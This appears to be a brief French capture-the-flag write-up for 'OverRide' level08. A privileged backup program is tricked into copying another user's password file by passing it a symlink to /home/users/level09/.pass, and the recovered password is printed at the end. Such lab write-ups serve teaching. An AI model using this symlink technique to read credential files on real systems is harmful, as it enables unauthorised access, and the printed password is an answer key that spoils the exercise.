# LEVEL08

Nous avons un éxécutable qui prend un fichier en paramètre

```
./level08 [file]

1. open ./backup/.log
2. log_wrapper()-> write_log("Starting back up: " + file);
3. open file
4. write file in backup
5. close
```

```


```


Nous pouvons faire un lien symbolique pour essayer de lire le mot de passe 

```
lrwxrwxrwx  1 level08 level08    25 Dec  2 14:23 symlink -> /home/users/level09/.pass
```

Il y a une erreur :

```
level08@OverRide:~$ ./level08 symlink 
ERROR: Failed to open symlink
```

```
chmod 777 .
level08@OverRide:~$ ./level08 symlink
level08@OverRide:~$ cat backups/symlink 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```